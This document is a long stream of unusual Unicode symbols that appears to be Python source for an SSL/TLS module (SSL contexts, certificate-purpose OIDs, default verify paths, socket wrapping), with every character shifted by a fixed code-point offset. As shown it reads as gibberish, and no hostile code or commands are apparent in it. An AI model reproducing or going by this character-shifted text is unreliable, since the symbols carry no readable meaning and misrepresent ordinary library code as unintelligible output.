꛹꛿꛽꜄ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛴꛹ꚫ꛾꜀ꛭ꛵꛰ꛮ꛿ꛌ꛷꛿ꛙꛬ꛸꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛺꛽ꚫ꛾꜀ꛭꚫ꛴꛹ꚫꛮ꛰꛽꛿ꚹ꛲꛰꛿ꚳꚲ꛾꜀ꛭ꛵꛰ꛮ꛿ꚲꚷꚫꚳꚴꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛺꛽ꚫ꛶꛰꜄ꚷꚫ꜁ꛬ꛷꜀꛰ꚫ꛴꛹ꚫ꛾꜀ꛭꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛣꛣꛣꚫꛬꛮꛮ꛺꛽ꛯ꛴꛹꛲ꚫ꛿꛺ꚫꛝꛑꛎꚫꚽꛃꚼꛃꚷꚫ꛿꛳꛰ꚫ꛸꛺꛾꛿ꚫ꛾꛻꛰ꛮ꛴꛱꛴ꛮꚫꛎ꛺꛸꛸꛺꛹ꚫꛙꛬ꛸꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛸꜀꛾꛿ꚫꛭ꛰ꚫ꜀꛾꛰ꛯꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛶꛰꜄ꚫꛈꛈꚫꚲꛮ꛺꛸꛸꛺꛹ꛙꛬ꛸꛰ꚲꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛪꛯ꛹꛾꛹ꛬ꛸꛰ꛪ꛸ꛬ꛿ꛮ꛳ꚳ꜁ꛬ꛷꜀꛰ꚷꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛹꛾꛹ꛬ꛸꛰꛾ꚹꛬ꛻꛻꛰꛹ꛯꚳ꜁ꛬ꛷꜀꛰ꚴꚕꚫꚫꚫꚫ꛴꛱ꚫ꛷꛰꛹ꚳꛯ꛹꛾꛹ꛬ꛸꛰꛾ꚴꚫꛉꚫꚼꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛎ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫꚰ꛽ꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭꛯ꛺꛰꛾꛹ꚲ꛿ꚫ꛸ꛬ꛿ꛮ꛳ꚫ꛰꛴꛿꛳꛰꛽ꚫ꛺꛱ꚫꚰ꛾ꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚰꚫꚳ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚷꚫꚲꚷꚫꚲꚹ꛵꛺꛴꛹ꚳ꛸ꛬ꛻ꚳ꛽꛰꛻꛽ꚷꚫꛯ꛹꛾꛹ꛬ꛸꛰꛾ꚴꚴꚴꚴꚕꚫꚫꚫꚫ꛰꛷꛴꛱ꚫ꛷꛰꛹ꚳꛯ꛹꛾꛹ꛬ꛸꛰꛾ꚴꚫꛈꛈꚫꚼꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛎ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫꚰ꛽ꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭꛯ꛺꛰꛾꛹ꚲ꛿ꚫ꛸ꛬ꛿ꛮ꛳ꚫꚰ꛽ꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚰꚫꚳ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚷꚫꛯ꛹꛾꛹ꛬ꛸꛰꛾ꛦꚻꛨꚴꚴꚕꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛎ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛹꛺ꚫꛬ꛻꛻꛽꛺꛻꛽꛴ꛬ꛿꛰ꚫꛮ꛺꛸꛸꛺꛹ꛙꛬ꛸꛰ꚫ꛺꛽ꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛾꜀ꛭ꛵꛰ꛮ꛿ꛌ꛷꛿ꛙꛬ꛸꛰ꚫ꛱꛴꛰꛷ꛯ꛾ꚫ꜂꛰꛽꛰ꚫ꛱꛺꜀꛹ꛯꚭꚴꚕꚕꚕꛏ꛰꛱ꛬ꜀꛷꛿ꛡ꛰꛽꛴꛱꜄ꛛꛬ꛿꛳꛾ꚫꛈꚫ꛹ꛬ꛸꛰ꛯ꛿꜀꛻꛷꛰ꚳꚭꛏ꛰꛱ꛬ꜀꛷꛿ꛡ꛰꛽꛴꛱꜄ꛛꛬ꛿꛳꛾ꚭꚷꚕꚫꚫꚫꚫꚭꛮꛬ꛱꛴꛷꛰ꚫꛮꛬ꛻ꛬ꛿꛳ꚫ꛺꛻꛰꛹꛾꛾꛷ꛪꛮꛬ꛱꛴꛷꛰ꛪ꛰꛹꜁ꚫ꛺꛻꛰꛹꛾꛾꛷ꛪꛮꛬ꛱꛴꛷꛰ꚫ꛺꛻꛰꛹꛾꛾꛷ꛪꛮꛬ꛻ꛬ꛿꛳ꛪ꛰꛹꜁ꚫꚭꚕꚫꚫꚫꚫꚭ꛺꛻꛰꛹꛾꛾꛷ꛪꛮꛬ꛻ꛬ꛿꛳ꚭꚴꚕꚕꛯ꛰꛱ꚫ꛲꛰꛿ꛪꛯ꛰꛱ꛬ꜀꛷꛿ꛪ꜁꛰꛽꛴꛱꜄ꛪ꛻ꛬ꛿꛳꛾ꚳꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛿꜀꛽꛹ꚫ꛻ꛬ꛿꛳꛾ꚫ꛿꛺ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚫꛮꛬ꛱꛴꛷꛰ꚫꛬ꛹ꛯꚫꛮꛬ꛻ꛬ꛿꛳ꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫ꛻ꛬ꛽꛿꛾ꚫꛈꚫꛪ꛾꛾꛷ꚹ꛲꛰꛿ꛪꛯ꛰꛱ꛬ꜀꛷꛿ꛪ꜁꛰꛽꛴꛱꜄ꛪ꛻ꛬ꛿꛳꛾ꚳꚴꚕꚕꚫꚫꚫꚫꚮꚫ꛰꛹꜁꛴꛽꛺꛹꛸꛰꛹꛿ꚫ꜁ꛬ꛽꛾ꚫ꛾꛳ꛬꛯ꛺꜂ꚫ꛻ꛬ꛿꛳꛾ꚕꚫꚫꚫꚫꛮꛬ꛱꛴꛷꛰ꚫꛈꚫ꛺꛾ꚹ꛰꛹꜁꛴꛽꛺꛹ꚹ꛲꛰꛿ꚳ꛻ꛬ꛽꛿꛾ꛦꚻꛨꚷꚫ꛻ꛬ꛽꛿꛾ꛦꚼꛨꚴꚕꚫꚫꚫꚫꛮꛬ꛻ꛬ꛿꛳ꚫꛈꚫ꛺꛾ꚹ꛰꛹꜁꛴꛽꛺꛹ꚹ꛲꛰꛿ꚳ꛻ꛬ꛽꛿꛾ꛦꚽꛨꚷꚫ꛻ꛬ꛽꛿꛾ꛦꚾꛨꚴꚕꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛏ꛰꛱ꛬ꜀꛷꛿ꛡ꛰꛽꛴꛱꜄ꛛꛬ꛿꛳꛾ꚳꛮꛬ꛱꛴꛷꛰ꚫ꛴꛱ꚫ꛺꛾ꚹ꛻ꛬ꛿꛳ꚹ꛴꛾꛱꛴꛷꛰ꚳꛮꛬ꛱꛴꛷꛰ꚴꚫ꛰꛷꛾꛰ꚫꛙ꛺꛹꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮꛬ꛻ꛬ꛿꛳ꚫ꛴꛱ꚫ꛺꛾ꚹ꛻ꛬ꛿꛳ꚹ꛴꛾ꛯ꛴꛽ꚳꛮꛬ꛻ꛬ꛿꛳ꚴꚫ꛰꛷꛾꛰ꚫꛙ꛺꛹꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚵ꛻ꛬ꛽꛿꛾ꚴꚕꚕꚕꛮ꛷ꛬ꛾꛾ꚫꛪꛌꛞꛙꚼꛚꛭ꛵꛰ꛮ꛿ꚳ꛹ꛬ꛸꛰ꛯ꛿꜀꛻꛷꛰ꚳꚭꛪꛌꛞꛙꚼꛚꛭ꛵꛰ꛮ꛿ꚭꚷꚫꚭ꛹꛴ꛯꚫ꛾꛳꛺꛽꛿꛹ꛬ꛸꛰ꚫ꛷꛺꛹꛲꛹ꛬ꛸꛰ꚫ꛺꛴ꛯꚭꚴꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛌꛞꛙꚹꚼꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꛴ꛯ꛰꛹꛿꛴꛱꛴꛰꛽ꚫ꛷꛺꛺꛶꜀꛻ꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꛪꛪ꛾꛷꛺꛿꛾ꛪꛪꚫꛈꚫꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛪ꛹꛰꜂ꛪꛪꚳꛮ꛷꛾ꚷꚫ꛺꛴ꛯꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹꛪꛪ꛹꛰꜂ꛪꛪꚳꛮ꛷꛾ꚷꚫꚵꛪ꛿꜃꛿ꚽ꛺ꛭ꛵ꚳ꛺꛴ꛯꚷꚫ꛹ꛬ꛸꛰ꛈꛑꛬ꛷꛾꛰ꚴꚴꚕꚕꚫꚫꚫꚫꛋꛮ꛷ꛬ꛾꛾꛸꛰꛿꛳꛺ꛯꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛱꛽꛺꛸꛹꛴ꛯꚳꛮ꛷꛾ꚷꚫ꛹꛴ꛯꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛎ꛽꛰ꛬ꛿꛰ꚫꛪꛌꛞꛙꚼꛚꛭ꛵꛰ꛮ꛿ꚫ꛱꛽꛺꛸ꚫꛚ꛻꛰꛹ꛞꛞꛗꚫ꛹꜀꛸꛰꛽꛴ꛮꚫꛔꛏꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹꛪꛪ꛹꛰꜂ꛪꛪꚳꛮ꛷꛾ꚷꚫꚵꛪ꛹꛴ꛯꚽ꛺ꛭ꛵ꚳ꛹꛴ꛯꚴꚴꚕꚕꚫꚫꚫꚫꛋꛮ꛷ꛬ꛾꛾꛸꛰꛿꛳꛺ꛯꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛱꛽꛺꛸꛹ꛬ꛸꛰ꚳꛮ꛷꛾ꚷꚫ꛹ꛬ꛸꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛎ꛽꛰ꛬ꛿꛰ꚫꛪꛌꛞꛙꚼꛚꛭ꛵꛰ꛮ꛿ꚫ꛱꛽꛺꛸ꚫ꛾꛳꛺꛽꛿ꚫ꛹ꛬ꛸꛰ꚷꚫ꛷꛺꛹꛲ꚫ꛹ꛬ꛸꛰ꚫ꛺꛽ꚫꛚꛔꛏꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹꛪꛪ꛹꛰꜂ꛪꛪꚳꛮ꛷꛾ꚷꚫꚵꛪ꛿꜃꛿ꚽ꛺ꛭ꛵ꚳ꛹ꛬ꛸꛰ꚷꚫ꛹ꛬ꛸꛰ꛈꛟ꛽꜀꛰ꚴꚴꚕꚕꚕꛮ꛷ꛬ꛾꛾ꚫꛛ꜀꛽꛻꛺꛾꛰ꚳꛪꛌꛞꛙꚼꛚꛭ꛵꛰ꛮ꛿ꚷꚫꛪꛐ꛹꜀꛸ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚫ꛻꜀꛽꛻꛺꛾꛰ꚫ꛱꛷ꛬ꛲꛾ꚫ꜂꛴꛿꛳ꚫꛣꛀꚻꛄ꜁ꚾꚫꛐ꜃꛿꛰꛹ꛯ꛰ꛯꚫꛖ꛰꜄ꚫꛠ꛾ꛬ꛲꛰ꚫ꛺ꛭ꛵꛰ꛮ꛿꛾ꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꛞꛐꛝꛡꛐꛝꛪꛌꛠꛟꛓꚫꛈꚫꚲꚼꚹꚾꚹꛁꚹꚼꚹꛀꚹꛀꚹꛂꚹꚾꚹꚼꚲꚕꚫꚫꚫꚫꛎꛗꛔꛐꛙꛟꛪꛌꛠꛟꛓꚫꛈꚫꚲꚼꚹꚾꚹꛁꚹꚼꚹꛀꚹꛀꚹꛂꚹꚾꚹꚽꚲꚕꚕꚕꛮ꛷ꛬ꛾꛾ꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚳꛪꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛌ꛹ꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚫ꛳꛺꛷ꛯ꛾ꚫ꜁ꛬ꛽꛴꛺꜀꛾ꚫꛞꛞꛗꚸ꛽꛰꛷ꛬ꛿꛰ꛯꚫꛮ꛺꛹꛱꛴꛲꜀꛽ꛬ꛿꛴꛺꛹ꚫ꛺꛻꛿꛴꛺꛹꛾ꚫꛬ꛹ꛯꚕꚫꚫꚫꚫꛯꛬ꛿ꛬꚷꚫ꛾꜀ꛮ꛳ꚫꛬ꛾ꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰꛾ꚫꛬ꛹ꛯꚫ꛻꛺꛾꛾꛴ꛭ꛷꜄ꚫꛬꚫ꛻꛽꛴꜁ꛬ꛿꛰ꚫ꛶꛰꜄ꚹꚭꚭꚭꚕꚫꚫꚫꚫꛪ꜂꛴꛹ꛯ꛺꜂꛾ꛪꛮ꛰꛽꛿ꛪ꛾꛿꛺꛽꛰꛾ꚫꛈꚫꚳꚭꛎꛌꚭꚷꚫꚭꛝꛚꛚꛟꚭꚴꚕꚕꚫꚫꚫꚫ꛾꛾꛷꛾꛺ꛮ꛶꛰꛿ꛪꛮ꛷ꛬ꛾꛾ꚫꛈꚫꛙ꛺꛹꛰ꚫꚫꚮꚫꛞꛞꛗꛞ꛺ꛮ꛶꛰꛿ꚫ꛴꛾ꚫꛬ꛾꛾꛴꛲꛹꛰ꛯꚫ꛷ꛬ꛿꛰꛽ꚹꚕꚫꚫꚫꚫ꛾꛾꛷꛺ꛭ꛵꛰ꛮ꛿ꛪꛮ꛷ꛬ꛾꛾ꚫꛈꚫꛙ꛺꛹꛰ꚫꚫꚮꚫꛞꛞꛗꛚꛭ꛵꛰ꛮ꛿ꚫ꛴꛾ꚫꛬ꛾꛾꛴꛲꛹꛰ꛯꚫ꛷ꛬ꛿꛰꛽ꚹꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛪ꛹꛰꜂ꛪꛪꚳꛮ꛷꛾ꚷꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꛈꛙ꛺꛹꛰ꚷꚫꚵꛬ꛽꛲꛾ꚷꚫꚵꚵ꛶꜂ꛬ꛽꛲꛾ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꜂ꛬ꛽꛹꛴꛹꛲꛾ꚹ꜂ꛬ꛽꛹ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛾꛾꛷ꚹꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚳꚴꚫ꜂꛴꛿꛳꛺꜀꛿ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫꛬ꛽꛲꜀꛸꛰꛹꛿ꚫ꛴꛾ꚫꛯ꛰꛻꛽꛰ꛮꛬ꛿꛰ꛯꚹꚭꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮꛬ꛿꛰꛲꛺꛽꜄ꛈꛏ꛰꛻꛽꛰ꛮꛬ꛿꛴꛺꛹ꛢꛬ꛽꛹꛴꛹꛲ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛿ꛬꛮ꛶꛷꛰꜁꛰꛷ꛈꚽꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫꛈꚫꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚫꛈꚫꛪꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚹꛪꛪ꛹꛰꜂ꛪꛪꚳꛮ꛷꛾ꚷꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪ꛰꛹ꛮ꛺ꛯ꛰ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚳ꛾꛰꛷꛱ꚷꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛴꛱ꚫ꛴꛾꛴꛹꛾꛿ꛬ꛹ꛮ꛰ꚳ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚷꚫ꛾꛿꛽ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚹ꛰꛹ꛮ꛺ꛯ꛰ꚳꚲ꛴ꛯ꛹ꛬꚲꚴꚹꛯ꛰ꛮ꛺ꛯ꛰ꚳꚲꛬ꛾ꛮ꛴꛴ꚲꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚹꛯ꛰ꛮ꛺ꛯ꛰ꚳꚲꛬ꛾ꛮ꛴꛴ꚲꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜂꛽ꛬ꛻ꛪ꛾꛺ꛮ꛶꛰꛿ꚳ꛾꛰꛷꛱ꚷꚫ꛾꛺ꛮ꛶ꚷꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꛈꛑꛬ꛷꛾꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꛈꛟ꛽꜀꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛻꛽꛰꛾꛾ꛪ꛽ꛬ꛲꛲꛰ꛯꛪ꛰꛺꛱꛾ꛈꛟ꛽꜀꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛈꛙ꛺꛹꛰ꚷꚫ꛾꛰꛾꛾꛴꛺꛹ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛞꛞꛗꛞ꛺ꛮ꛶꛰꛿ꚫꛮ꛷ꛬ꛾꛾ꚫ꛳ꛬ꛹ꛯ꛷꛰꛾ꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫ꛰꛹ꛮ꛺ꛯ꛴꛹꛲ꚫꛭ꛰꛱꛺꛽꛰ꚫ꛴꛿ꚫꛮꛬ꛷꛷꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛮ꛿꜃ꚹꛪ꜂꛽ꛬ꛻ꛪ꛾꛺ꛮ꛶꛰꛿ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹ꛾꛾꛷꛾꛺ꛮ꛶꛰꛿ꛪꛮ꛷ꛬ꛾꛾ꚹꛪꛮ꛽꛰ꛬ꛿꛰ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꛈ꛾꛺ꛮ꛶ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꛈ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꛈꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛻꛽꛰꛾꛾ꛪ꛽ꛬ꛲꛲꛰ꛯꛪ꛰꛺꛱꛾ꛈ꛾꜀꛻꛻꛽꛰꛾꛾ꛪ꛽ꛬ꛲꛲꛰ꛯꛪ꛰꛺꛱꛾ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛈ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꛈ꛾꛰꛷꛱ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛾꛾꛴꛺꛹ꛈ꛾꛰꛾꛾꛴꛺꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜂꛽ꛬ꛻ꛪꛭ꛴꛺ꚳ꛾꛰꛷꛱ꚷꚫ꛴꛹ꛮ꛺꛸꛴꛹꛲ꚷꚫ꛺꜀꛿꛲꛺꛴꛹꛲ꚷꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꛈꛑꛬ꛷꛾꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛈꛙ꛺꛹꛰ꚷꚫ꛾꛰꛾꛾꛴꛺꛹ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛙ꛰꛰ꛯꚫ꛿꛺ꚫ꛰꛹ꛮ꛺ꛯ꛰ꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫ꛳꛰꛽꛰ꚫꛭ꛰ꛮꛬ꜀꛾꛰ꚫꛪ꜂꛽ꛬ꛻ꛪꛭ꛴꛺ꚳꚴꚫꛮꛬ꛹ꚫ꛺꛹꛷꜄ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛳ꛬ꛹ꛯ꛷꛰ꚫꛌꛞꛎꛔꛔꚫ꛾꛿꛽ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹ꛾꛾꛷꛺ꛭ꛵꛰ꛮ꛿ꛪꛮ꛷ꛬ꛾꛾ꚹꛪꛮ꛽꛰ꛬ꛿꛰ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛹ꛮ꛺꛸꛴꛹꛲ꚷꚫ꛺꜀꛿꛲꛺꛴꛹꛲ꚷꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꛈ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛈ꛾꛰꛷꛱ꚹꛪ꛰꛹ꛮ꛺ꛯ꛰ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚳ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚴꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛾꛾꛴꛺꛹ꛈ꛾꛰꛾꛾꛴꛺꛹ꚷꚫꛮ꛺꛹꛿꛰꜃꛿ꛈ꛾꛰꛷꛱ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛿ꛪ꛹꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷꛾ꚳ꛾꛰꛷꛱ꚷꚫ꛹꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷꛾ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꜂ꛬ꛽꛹꛴꛹꛲꛾ꚹ꜂ꛬ꛽꛹ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛾꛾꛷ꚫꛙꛛꛙꚫ꛴꛾ꚫꛯ꛰꛻꛽꛰ꛮꛬ꛿꛰ꛯꚷꚫ꜀꛾꛰ꚫꛌꛗꛛꛙꚫ꛴꛹꛾꛿꛰ꛬꛯꚭꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛏ꛰꛻꛽꛰ꛮꛬ꛿꛴꛺꛹ꛢꛬ꛽꛹꛴꛹꛲ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛿ꛬꛮ꛶꛷꛰꜁꛰꛷ꛈꚽꚕꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛻꛽꛺꛿꛺꛾ꚫꛈꚫꛭ꜄꛿꛰ꛬ꛽꛽ꛬ꜄ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛺꛽ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꛴꛹ꚫ꛹꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭꚫꛈꚫꛭ꜄꛿꛰